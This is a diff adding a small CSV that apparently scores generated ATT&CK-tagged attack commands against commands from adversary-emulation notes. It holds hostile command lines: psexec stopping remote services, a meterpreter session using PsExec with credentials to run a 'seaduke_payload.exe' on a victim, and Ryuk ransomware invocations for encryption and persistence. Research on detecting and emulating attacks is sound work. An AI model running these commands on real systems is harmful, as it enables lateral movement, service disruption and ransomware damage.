@@ -1,0 +1,10 @@
+file,tool,input_command,matched_command,edit_score,match_found
+command_psexec_TA0040_T1489.txt,psexec,"psexec \\remote_system -s -accepteula -nobanner cmd /c ""net stop <service_name>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.291,True
+command_psexec_TA0040_T1489.txt,psexec,"psexec \\remote_system -l -accepteula -nobanner cmd /c ""sc stop <service_name>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.293,True
+command_psexec_TA0040_T1489.txt,psexec,"psexec \\remote_system -r <remote_service> -accepteula -nobanner cmd /c ""net stop <service_name>""","[meterpreter (PowerShell)\*] > `.\PsExec64.exe -accepteula \\<victim 2 IP> -u ""domainName\username"" -p P@ssw0rd -i <session ID> ""C:\Windows\Temp\seaduke_payload.exe""
+`",0.273,True
+command_ryuk_TA0002_T1053.txt,ryuk,ryuk.exe /schtasks,`ryuk.exe --encrypt --process-name notepad.exe`,0.369,True
+command_ryuk_TA0003_T1543.txt,ryuk,ryuk.exe /p <persist_file_path>,`ryuk.exe --encrypt --process-name notepad.exe`,0.487,True
+command_ryuk_TA0004_T1543.txt,ryuk,ryuk.exe /target:C:\Windows\System32\services.exe,`ryuk.exe --encrypt --process-name notepad.exe`,0.396,True
